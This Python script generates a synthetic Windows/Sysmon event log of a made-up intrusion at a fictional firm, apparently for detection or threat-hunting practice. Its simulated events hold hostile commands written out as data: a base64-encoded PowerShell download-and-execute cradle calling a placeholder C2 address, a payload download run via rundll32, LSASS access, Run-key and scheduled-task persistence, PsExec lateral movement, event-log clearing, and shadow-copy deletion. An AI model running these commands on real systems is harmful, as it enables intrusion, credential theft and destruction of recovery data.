#!/usr/bin/env python3
"""
Generate sample_attack.jsonl: a fictional, simulated intrusion at "Orvane Logistics",
mixed with normal background noise. All hosts, users and IPs are made up
(IPs come from the RFC 5737 documentation ranges).

Scenario
  ORV-DC01     : password spraying against the domain controller
  ORV-LT-0117  : phishing doc -> macro -> encoded PowerShell -> payload download ->
            C2 -> discovery -> LSASS dump -> persistence -> lateral movement ->
            log wiping -> shadow copy deletion
"""
import base64
import json
import random
from datetime import datetime, timedelta, timezone

random.seed(7)
T0 = datetime(2026, 11, 20, 8, 55, tzinfo=timezone.utc)
HOST, DC, USER = "ORV-LT-0117.orvane.local", "ORV-DC01.orvane.local", "ORVANE\\d.levinson"
C2 = "203.0.113.66"
_guid = 0
events = []


def guid() -> str:
    global _guid
    _guid += 1
    return f"{{4f1c2a9e-{_guid:04x}-6731-0b00-00000000{_guid:04x}}}"


def ts(sec: float) -> str:
    return (T0 + timedelta(seconds=sec)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def proc(sec, image, cmd, parent, user=USER, host=HOST):
    g = guid()
    events.append({"EventID": 1, "Computer": host, "UtcTime": ts(sec), "ProcessGuid": g,
                   "ProcessId": random.randint(1000, 9000), "Image": image, "CommandLine": cmd,
                   "User": user, "ParentProcessGuid": parent["ProcessGuid"] if parent else "",
                   "ParentImage": parent["Image"] if parent else ""})
    return events[-1]


def add(sec, eid, host=HOST, **fields):
    events.append({"EventID": eid, "Computer": host, "UtcTime": ts(sec), **fields})


SYS32 = "C:\\Windows\\System32\\"

# ---------------------------------------------------------- background noise
explorer = proc(0, SYS32[:-9] + "explorer.exe", "C:\\Windows\\Explorer.EXE", None)
for i in range(25):
    s = 10 + i * 140
    chrome = proc(s, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                  '"chrome.exe" --type=renderer', explorer)
    add(s + 2, 3, Image=chrome["Image"], ProcessGuid=chrome["ProcessGuid"],
        DestinationIp=f"142.250.{random.randint(1, 250)}.{random.randint(1, 250)}", DestinationPort="443")
    proc(s + 30, SYS32 + "svchost.exe", "svchost.exe -k netsvcs -p", None, user="NT AUTHORITY\\SYSTEM")
    add(s + 60, 4624, host=DC, TargetUserName=random.choice(["d.levinson", "m.peretz", "a.khoury"]),
        IpAddress=f"10.0.4.{random.randint(10, 60)}", LogonType="3")
proc(400, SYS32 + "notepad.exe", "notepad.exe C:\\Users\\d.levinson\\Documents\\todo.txt", explorer)
proc(900, SYS32 + "ipconfig.exe", "ipconfig /all", explorer)
add(1200, 13, Image=SYS32 + "svchost.exe", TargetObject="HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge\\Homepage",
    Details="https://intranet.orvane.local")

# ----------------------------------------------- stage 0: password spraying (DC)
for i in range(8):
    add(300 + i * 6, 4625, host=DC, TargetUserName=random.choice(["admin", "administrator", "d.levinson", "svc_backup"]),
        IpAddress="198.51.100.23", LogonType="3", FailureReason="%%2313")

# ------------------------------------------------------- stage 1: the phish
A = 1500
word = proc(A, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            '"WINWORD.EXE" /n "C:\\Users\\d.levinson\\Downloads\\Q4_Freight_Invoice_88213.docm"', explorer)
payload = base64.b64encode(
    f"IEX (New-Object Net.WebClient).DownloadString('http://{C2}/stage2.ps1')".encode("utf-16le")).decode()
ps = proc(A + 4, SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
          f"powershell.exe -nop -w hidden -enc {payload}", word)
ps2 = proc(A + 6, SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
           f"powershell.exe -nop -c \"(New-Object Net.WebClient).DownloadFile('http://{C2}/upd.dll',"
           f"'C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll')\"", ps)
add(A + 7, 3, Image=ps2["Image"], ProcessGuid=ps2["ProcessGuid"], DestinationIp=C2, DestinationPort="80")
add(A + 9, 11, Image=ps2["Image"], ProcessGuid=ps2["ProcessGuid"],
    TargetFilename="C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll")
implant = proc(A + 12, SYS32 + "rundll32.exe",
               "rundll32.exe C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start", ps)
add(A + 15, 3, Image=implant["Image"], ProcessGuid=implant["ProcessGuid"], DestinationIp=C2, DestinationPort="443")

# ------------------------------------------------------ stage 2: discovery
cmd = proc(A + 120, SYS32 + "cmd.exe", "cmd.exe /c", implant)
proc(A + 122, SYS32 + "whoami.exe", "whoami /all", cmd)
proc(A + 128, SYS32 + "systeminfo.exe", "systeminfo", cmd)
proc(A + 135, SYS32 + "net.exe", "net group \"Domain Admins\" /domain", cmd)
proc(A + 141, SYS32 + "nltest.exe", "nltest /domain_trusts /all_trusts", cmd)

# ------------------------------------------------- stage 3: credential theft
add(A + 300, 10, SourceImage=implant["Image"], SourceProcessGuid=implant["ProcessGuid"],
    TargetImage=SYS32 + "lsass.exe", GrantedAccess="0x1010")

# --------------------------------------------------------- stage 4: persistence
add(A + 420, 13, Image=implant["Image"], ProcessGuid=implant["ProcessGuid"],
    TargetObject="HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
    Details="rundll32.exe C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start")
proc(A + 430, SYS32 + "schtasks.exe",
     'schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "rundll32 C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start" /sc onlogon',
     cmd)

# -------------------------------------------------- stage 5: lateral movement
proc(A + 900, "C:\\Users\\Public\\PsExec64.exe",
     "PsExec64.exe \\\\ORV-FS02 -u ORVANE\\svc_backup -s cmd.exe", cmd)

# ----------------------------------------------- stage 6: cover tracks + impact
proc(A + 1500, SYS32 + "wevtutil.exe", "wevtutil cl Microsoft-Windows-Sysmon/Operational", cmd)
add(A + 1502, 1102, SubjectUserName="d.levinson", SubjectDomainName="ORVANE")
proc(A + 1560, SYS32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", cmd)

if __name__ == "__main__":
    events.sort(key=lambda ev: ev["UtcTime"])
    with open("sample_attack.jsonl", "w", encoding="utf-8") as fh:
        for ev in events:
            fh.write(json.dumps(ev) + "\n")
    print(f"Wrote {len(events)} events to sample_attack.jsonl")
